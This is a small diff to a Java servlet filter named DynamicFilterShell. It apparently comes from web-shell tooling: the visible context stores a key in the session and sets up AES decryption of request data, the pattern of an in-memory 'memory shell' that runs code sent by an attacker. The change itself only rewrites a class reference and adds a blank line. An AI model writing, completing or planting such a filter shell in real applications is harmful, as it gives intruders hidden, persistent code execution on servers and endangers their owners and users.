@@ -52,7 +52,7 @@ public class DynamicFilterShell implements Filter {
                 HttpSession session = ((HttpServletRequest)servletRequest).getSession();
                 session.putValue("u", k);
                 Cipher c = Cipher.getInstance("AES");
-                c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
+                c.init(2, new javax.crypto.spec.SecretKeySpec(k.getBytes(), "AES"));
 
                 HashMap map = new HashMap();
                 map.put("request", servletRequest);
@@ -90,6 +90,7 @@ public class DynamicFilterShell implements Filter {
         }else{
             filterChain.doFilter(servletRequest, servletResponse);
         }
+
     }
 
     @Override
